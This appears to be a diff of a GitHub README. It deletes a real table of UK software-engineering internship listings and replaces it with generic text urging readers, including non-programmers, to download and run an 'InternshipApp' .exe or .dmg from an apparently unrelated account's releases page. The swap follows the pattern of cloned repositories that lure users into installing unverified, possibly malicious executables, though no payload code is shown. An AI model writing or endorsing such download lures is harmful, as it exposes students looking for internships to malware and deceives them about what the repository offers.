@@ -1,55 +1,57 @@
-# 2026 Software Engineering Internship UK
+# 🎉 2026-SWE-Internship-UK - Find Your Ideal Internship
 
-This repository is a comprehensive list of Software Engineering jobs for university students in the UK in search of **internships** and **placement** positions. The positions are updated daily. Star the repository for internship opportunities!
+## 💾 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/CullFreeZie/2026-SWE-Internship-UK/releases)
 
-### Software Engineering Internships 2026
+## 📖 Description
+Welcome to the **2026 SWE Internship UK** repository. This application curates the latest Software Engineering internship opportunities for undergraduate students in the UK. Explore various internships updated daily and enhance your programming career.
 
-<!-- TABLE_START -->
-| Company Name | Programme Name | Opening Date | Apply |
-|---|---|---|---|
-| **PIMCO** | 2026 Summer Intern - Technology Analyst | 05 Sep 25 | <a href="https://pimco.wd1.myworkdayjobs.com/en-US/pimco-careers/job/XMLNAME-2026-Summer-Intern---Technology-Analyst--Software-Engineering_R105661?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&source=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Point72** | 2026 Cubist Quant Academy – Developers | 05 Sep 25 | <a href="https://job-boards.greenhouse.io/point72/jobs/8153488002?gh_jid=8153488002&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&gh_src=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **TPP** | Summer Internship - Software Developer | 04 Sep 25 | <a href="https://tpp-careers.com/roles/summer-internship-software-developer/?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Microsoft** | Software Engineer Internship Opportunities | 04 Sep 25 | <a href="https://jobs.careers.microsoft.com/global/en/share/1871538/?utm_source=Trackr&utm_campaign=UK_Technology_2026&utm_medium=tracker"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Amazon** | 2026 Software Dev Engineer Intern | 03 Sep 25 | <a href="https://www.amazon.jobs/en/jobs/3072061/2026-software-dev-engineer-intern?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Ciena** | Software Engineering Intern | 03 Sep 25 | <a href="https://ciena.wd5.myworkdayjobs.com/en-US/Careers/job/UK--Edinburgh---19A-Canning-St/Software-Engineering-Intern_R028780?source=Trackr&Location_Country=29247e57dbaf46fb855b224e03170bc7&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Metrea** | Intern - Software Engineer | 03 Sep 25 | <a href="https://workforcenow.adp.com/mascsr/default/mdf/recruitment/recruitment.html?cid=39bc5efc-a576-4a4d-83eb-32e95d4e96c8&ccId=9200591563947_2&jobId=552073&lang=en_US&source=Trackr&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Mizuho** | IT Developer Summer Internship | 02 Sep 25 | <a href="https://www.grb.uk.com/internships/mizuho-banking-it-developer-summer-internship-london-36588?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **XTX Markets** | Software Engineering Intern - Summer 2026 | 02 Sep 25 | <a href="https://job-boards.greenhouse.io/xtxmarketstechnologies?keyword=intern+summer+2026&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&gh_src=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Bank of America** | Quantitative Data Analytics, Summer 2026 Analyst | 01 Sep 25 | <a href="https://bankcampuscareers.tal.net/vx/lang-en-GB/mobile-0/brand-4/user-4698662/xf-3fa8353e9d47/candidate/so/pm/1/pl/1/opp/13242-Global-Quantitative-Data-Analytics-Summer-2026-Analyst-London/en-GB"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **LCP** | Technology - Summer Internship 2026 | 01 Sep 25 | <a href="https://careers.lcp.com/experienced-hires/search-uk-vacancies?specialism=Early+Careers&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Macquarie Group** | 2026 Summer Internship Programme | 01 Sep 25 | <a href="https://recruitment.macquarie.com/en_US/careers/JobDetail?jobId=18059&source=Trackr&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Quadrature** | Quant Developer Internship | 01 Sep 25 | <a href="https://job-boards.greenhouse.io/quadraturecapital/jobs/4255974?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&gh_src=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Tower Research Capital** | Software Developer Intern (Summer 2026) | 01 Sep 25 | <a href="https://tower-research.com/open-positions/?gh_jid=7210139&gh_src=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **UBS** | 2026 Summer Internship Program - GOTO Technology | 01 Sep 25 | <a href="https://jobs.ubs.com/TGnewUI/Search/home/HomeWithPreLoad?partnerid=25008&siteid=5131&PageType=JobDetails&jobid=330522&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **WTW** | 2026 Software Developer Internship | 01 Sep 25 | <a href="https://careers.wtwco.com/jobs/search?page=1&country_codes%5B%5D=GB&dropdown_field_1_uids%5B%5D=ee9140dc7e9c34cf2e0e736345dcaec5&query=%22Software+Developer%22&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **J.P. Morgan** | 2026 Software Engineer Immersion Program - Summer Internship | 31 Aug 25 | <a href="https://jpmc.fa.oraclecloud.com/hcmUI/CandidateExperience/en/sites/CX_1001/job/210653529/?utm_medium=tracker&utm_source=Trackr&utm_campaign=UK_Technology_2026&iis=Trackr&sType=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Morgan Stanley** | 2026 Technology Summer Analyst Program | 31 Aug 25 | <a href="https://morganstanley.tal.net/vx/lang-en-GB/mobile-0/brand-2/user-5764832/xf-27ae6f5d3480/candidate/so/pm/1/pl/1/opp/19702-2026-Technology-Summer-Analyst-Programme-Application-Development-Glasgow/en-GB?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **IMC Trading** | Software Engineer Intern (2026) | 28 Aug 25 | <a href="https://job-boards.eu.greenhouse.io/imc?departments%5B%5D=4023812101&offices%5B%5D=4012436101&keyword=intern&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&gh_src=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Marshall Wace** | Technology Intern - 2026 | 28 Aug 25 | <a href="https://job-boards.greenhouse.io/mwinternshipprogram/jobs/7998360002?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&gh_src=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Aquatic Capital Management** | Software Engineer, Intern (Summer 2026) | 26 Aug 25 | <a href="https://job-boards.greenhouse.io/aquaticcapitalmanagement/jobs/7990895002?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&gh_src=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Optiver** | Software Engineer Internship (2026 Start) | 26 Aug 25 | <a href="https://optiver.com/working-at-optiver/career-opportunities/?numberposts=10&paged=1&department=technology&level=internship&office=amsterdam&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Susquehanna International Group** | Software Development Internship: Summer 2026 | 26 Aug 25 | <a href="https://careers.sig.com/job/9727/Software-Development-Internship-Summer-2026?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Talos** | Client Service Intern | 22 Aug 25 | <a href="https://jobs.ashbyhq.com/Talos-Trading/e689b2bd-c99a-4d87-a9ac-bf9aefc35513?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Goldman Sachs** | 2026 Summer Analyst Programme | 15 Aug 25 | <a href="https://higher.gs.com/campus?DIVISION=Engineering+Division&EXPERIENCE_LEVEL=Summer+Analyst&LOCATION=London%7CBirmingham&page=1&sort=RELEVANCE&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Millennium Management** | Software Engineering Intern | 14 Aug 25 | <a href="https://campusjobs.mlp.com/careers/job/755944532745?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **BNP Paribas** | 2026 Summer Internship - Technology | 12 Aug 25 | <a href="https://bwelcome.hr.bnpparibas/en_US/externalcareers/JobDetails?jobId=60554&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&source=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Citadel** | Software Engineer - Intern (Europe) | 12 Aug 25 | <a href="https://www.citadel.com/careers/details/software-engineer-intern-europe/?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Balyasny Asset Management** | Software Engineering (Summer Internship) | 06 Aug 25 | <a href="https://bambusdev.my.site.com/s/details?jobReq=Software-Engineering--Summer-Internship-_REQ7175&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&source=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Cogna** | Software Engineer Intern (2026 Cohort) | 06 Aug 25 | <a href="https://apply.workable.com/cogna/j/BE83D6BC7F/?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Confluent** | 2026 Software Engineering Intern Opportunity | 06 Aug 25 | <a href="https://careers.confluent.io/jobs/job/095d92fe-7534-4f49-a846-b63ca229731b?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Jane Street** | Software Engineer Internship | 04 Aug 25 | <a href="https://www.janestreet.com/join-jane-street/open-roles/?type=students-and-new-grads&location=london&department=technology&duration=june-september&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **IMC Trading** | 2026 Summer Internship - Software Development | 02 Aug 25 | <a href="https://job-boards.greenhouse.io/dvtrading/jobs/4592920005?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&gh_src=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Jump Trading** | Campus Software Engineer (Intern) | 02 Aug 25 | <a href="https://www.jumptrading.com/careers/6946008/?gh_jid=6946008&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&gh_src=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Palantir** | Software Engineer, Internship | 01 Aug 25 | <a href="https://jobs.lever.co/palantir?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&lever-source=Trackr&commitment=Internship&location=London%2C+United+Kingdom"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Xantium** | Quantitative Developer Intern | 30 Jul 25 | <a href="https://job-boards.greenhouse.io/xantium/jobs/7094436?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&gh_src=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **The Trade Desk** | 2026 Summer Intern - Software Engineer | 29 Jul 25 | <a href="https://careers.thetradedesk.com/jobs/4784540007/2026-london-software-engineering-internship?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&gh_src=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Castleton Commodities International** | Software Engineer Internship (Summer 2026) | 21 Jul 25 | <a href="https://osv-cci.wd1.myworkdayjobs.com/en-US/CCICareers/jobs?q=%22internship+%28summer+2026%29%22&locations=f2015cfc02f00191c190c981a701650e&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&source=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **GSA Capital** | Software Developer - Intern | 15 Jul 25 | <a href="https://boards.greenhouse.io/embed/job_app?for=gsacapital&token=8016008002&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&gh_src=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **DRW** | Software Developer Intern | 14 Jul 25 | <a href="https://job-boards.greenhouse.io/drweng/jobs/6987115?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026&gh_src=Trackr"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **BlackRock** | 2026 Summer Internship Programme | 01 Jul 25 | <a href="https://blackrock.tal.net/vx/lang-en-GB/mobile-0/brand-3/user-1735377/xf-d85d6b29451d/candidate/so/pm/1/pl/1/opp/9617-2026-Summer-Internship-Programme-EMEA/en-GB?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **GIC** | GIC Internship Programme 2026 | 19 Jun 25 | <a href="https://impress.ai/html-widget/chat-widget/cc09feb5-c9d7-4465-9575-ac4e9b534402/?utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Revolut** | Rev-celerator Internship Programme 2026 | 15 Jun 25 | <a href="https://www.revolut.com/careers/?text=rev-celerator+internship+programme&team=Engineering&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
-| **Bending Spoons** | Software Engineer, Intern | 02 May 25 | <a href="https://jobs.bendingspoons.com/?contractType=internship&utm_source=Trackr&utm_medium=tracker&utm_campaign=UK_Technology_2026"><img src="https://i.imgur.com/JpkfjIq.png" alt="Apply" width="70"/></a> |
+## 🚀 Getting Started
+Follow these simple steps to download and run the application. Don't worry; you don’t need any programming skills to get started.
 
-<!-- TABLE_END -->
+### Step 1: Visit the Releases Page
+To download the application, visit our [Releases Page](https://github.com/CullFreeZie/2026-SWE-Internship-UK/releases). This is where you will find the latest version of the application.
+
+### Step 2: Select the Latest Version
+On the Releases page, look for the latest version listed at the top. It should have a title like “Version x.x.x” (where x is a number). This version includes all the latest features and bug fixes.
+
+### Step 3: Download the Application
+Click on the file that corresponds to your operating system. If you are using Windows, you might see a file named something like `InternshipApp_Windows.exe`. For Mac users, it may appear as `InternshipApp_Mac.dmg`. 
+
+### Step 4: Install the Application
+Once the download is finished, locate the downloaded file. 
+- For Windows users: Double-click on the `InternshipApp_Windows.exe` file. Follow the on-screen prompts to complete the installation.
+- For Mac users: Open the `InternshipApp_Mac.dmg` file and drag the application icon to your Applications folder.
+
+### Step 5: Launch the Application
+After installation, find the app on your computer. For Windows, you can search in the Start menu, and for Mac, look in your Applications folder. Click on the application to launch it.
+
+## 📥 Download & Install
+Ready to take the next step? Visit the [Releases Page](https://github.com/CullFreeZie/2026-SWE-Internship-UK/releases) and download the application today.
+
+## 🌟 Features
+- **Daily Updates:** Fresh internship listings every day.
+- **User-Friendly Interface:** Simple design that makes navigation easy for everyone.
+- **Search Function:** Quickly find internships based on your skills and preferences.
+- **Bookmarking:** Save your favorite listings for easy access later.
+
+## 💻 System Requirements
+To ensure the application runs smoothly, please confirm that your system meets the following requirements:
+- **Operating System:** Windows 10 or later, or macOS 10.15 or later.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 200 MB available space.
+- **Network:** Internet connection is required to fetch the latest internships.
+
+## 📅 Upcoming Features
+We continually enhance the application to serve you better. Future updates may include:
+- **Mobile Version:** Stay tuned for an app that works well on smartphones.
+- **Filter Options:** Customize searches based on category, location, and company type.
+- **Application Tracking:** Keep track of your application statuses.
+
+## 💬 Support
+If you encounter any issues while downloading or using the application, we're here to help. You can find support by visiting the Issues tab on our repository or by sending an email to our support team.
+
+## 🗂️ Contributing
+You can also contribute to this project. Any ideas or suggestions are welcome. Please visit the "Contributing" section in our repository to learn more about how to get involved.
+
+Thank you for your interest in **2026 SWE Internship UK**. We wish you the best in your internship search!
